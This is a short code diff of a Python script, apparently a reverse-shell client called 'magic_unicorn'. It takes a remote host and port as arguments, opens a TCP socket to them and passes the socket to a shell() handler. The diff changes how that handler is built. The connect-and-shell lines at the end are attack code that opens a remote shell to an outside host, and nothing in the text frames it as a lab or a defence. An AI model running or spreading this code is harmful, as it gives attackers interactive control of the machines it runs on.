@@ -44,9 +44,9 @@ class badges:
         self.RESET = '\033[0m'
 
 class magic_unicorn:
-    def __init__(self, unicorn_handler):
+    def __init__(self, s):
         self.version = "v2.0"
-        self.unicorn = unicorn_handler(s)
+        self.unicorn = handler(s)
         self.badges = badges()
 
     def install(self, package):
@@ -227,8 +227,8 @@ if len(sys.argv) != 3:
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
 
-magic_unicorn = magic_unicorn(handler)
-
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
-magic_unicorn.shell()
+
+magic_unicorn_handler = magic_unicorn(s)
+magic_unicorn_handler.shell()
